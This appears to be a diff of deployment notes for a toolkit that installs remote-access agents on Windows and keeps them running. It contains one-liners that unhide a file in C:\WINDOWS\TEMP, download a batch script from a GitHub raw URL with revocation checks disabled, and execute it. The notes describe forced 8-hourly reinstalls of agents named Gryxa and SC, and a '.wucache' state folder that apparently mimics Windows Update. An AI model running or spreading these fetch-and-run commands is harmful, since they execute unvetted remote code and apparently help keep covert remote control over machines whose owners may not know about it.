@@ -1,20 +1,15 @@
-UNIVERSAL DEPLOY (O37 / M27 / S8 — Gryxa offline fix):
+UNIVERSAL DEPLOY (O38 / M28 / L15 — Gryxa 8h deep health):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o37" & findstr /C:"OWN BUILD 20260802O37" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o38" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin (if main raw lags):
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/bf9a721bffbfa9e6514d49eee1b75b1766c21ea0/own.txt" & findstr /C:"OWN BUILD 20260802O37" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O38" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O37 root cause:
-- Sevrz + Gryxa MSIs share legacy UpgradeCodes {0C94448B…}/{1F85D7FE…}.
-  msiexec /i of sevrz can knock Gryxa offline in the panel.
-- Prior builds LockDir'd SC install dirs → client cannot write → panel OFFLINE
-  while service still shows Running.
+O38 Gryxa health:
+- Every mon tick: light ensure (service Running + dir).
+- Every 8 hours (gryxa_deep.flag): download fresh MSI from ui.gryxa.com,
+  detect fingerprint drift (server/keys change), TCP to update.gryxa.com
+  AND/OR ui.gryxa.com:443, relay config, then /x+/i reinstall until HEALTHY.
+- Current FP stored in .wucache\gryxa.cfg (exterminate/secure/tg follow it).
 
-O37 fixes:
-- Refuse sevrz /i when Gryxa registered/present; /fa only + protect alert.
-- After any sevrz /i, immediately EnsureGryxaMust.
-- Gryxa heal: start → /fa → clean /x+/i (never /i over registered).
-- Unlock previously LockDir'd SC dirs; never LockDir SC again.
-
-Expect: Source O37 | MON=M27 | SEC=S8 | Gryxa stays online in panel.
+Expect: Source O38 | MON=M28 | LIB=L15 | TGR=T16 | SEC=S9
